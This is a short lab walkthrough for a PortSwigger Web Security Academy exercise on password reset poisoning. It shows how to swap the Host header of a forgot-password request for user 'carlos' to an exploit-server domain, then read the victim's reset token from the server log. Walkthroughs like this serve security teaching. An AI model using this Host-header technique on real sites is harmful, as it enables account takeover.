The steps below are meant to solve the following lab:
https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning/lab-host-header-basic-password-reset-poisoning

Clicking on the forgot password link and supplying the username "carlos" and intercepting the request will show the following value in the Host header:
Host: [SUB_DOMAIN].web-security-academy.net

Changing the value in the Host header to the exploit server:
Host: [SUB_DOMAIN].exploit-server.net

Sending the intercepted request and checking the log history of the exploit server will show the token for a password reset belonging to Carlos:
"GET /forgot-password?temp-forgot-password-token=[TOKEN] HTTP/1.1" 404 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
